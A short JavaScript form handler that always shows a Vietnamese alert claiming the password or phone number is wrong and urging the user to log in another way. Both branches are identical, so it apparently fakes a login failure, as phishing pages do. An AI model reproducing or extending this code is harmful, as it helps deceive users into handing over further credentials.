function checkForm(){
    var number = document.getElementById('name').value;
    if(isNaN(number)){
        alert("Mật khẩu gồm 6 chữ hoặc số điện thoại không đúng.Đăng nhập bằng cách khác dưới đây");
    }else{
        alert("Mật khẩu gồm 6 chữ hoặc số điện thoại không đúng.Đăng nhập bằng cách khác dưới đây")
    }
}